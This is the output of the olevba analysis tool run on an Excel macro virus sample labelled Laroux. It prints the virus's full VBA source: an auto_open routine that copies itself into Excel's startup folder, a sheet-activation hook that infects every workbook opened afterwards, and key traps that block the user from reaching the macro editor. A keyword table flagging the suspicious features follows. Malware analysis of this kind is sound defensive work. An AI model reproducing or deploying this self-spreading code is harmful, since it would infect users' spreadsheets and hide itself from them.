olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-2ecfbb5401786274e4b89a174360633709795eee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-2ecfbb5401786274e4b89a174360633709795eee - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-2ecfbb5401786274e4b89a174360633709795eee - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ASŒN
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  N\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ŒN\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 	N\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ÛV\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ”N\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - mQ\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - N\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - kQ\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ]N\x08
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - AS\x08
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - AS N
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ASŒN
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

